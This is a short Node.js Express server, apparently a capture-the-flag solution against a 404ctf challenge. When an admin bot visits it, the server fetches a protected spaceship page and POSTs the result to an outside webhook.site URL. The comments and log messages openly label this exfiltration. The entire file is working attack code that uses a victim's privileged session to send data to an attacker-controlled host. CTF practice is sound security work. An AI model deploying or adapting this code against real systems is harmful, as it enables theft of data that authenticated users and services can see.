
const express = require('express');
const fetch = require('node-fetch');
const app = express();
const port = process.env.PORT || 3000;

// Replace with your webhook URL
const WEBHOOK_URL = "https://webhook.site/714d78b3-a2b4-46a1-842f-0f5dcfda846a";

app.get('/', async (req, res) => {
  const targetUrl = "http://spacefleetcommand.404ctf.fr/spaceship/3";

  try {
    const response = await fetch(targetUrl, {
      headers: {
        // The admin cookie will be set by the bot — do NOT override it here.
      }
    });

    const text = await response.text();

    // Exfiltrate the result to your webhook
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'text/plain' },
      body: text
    });

    res.send("<h1> Bot visited, exfiltration attempted!</h1>");
  } catch (err) {
    console.error("Fetch or exfiltration failed:", err);
    res.status(500).send("Error fetching or sending data.");
  }
});

app.listen(port, () => {
  console.log(`[*] Exfiltration server running on port ${port}`);
});
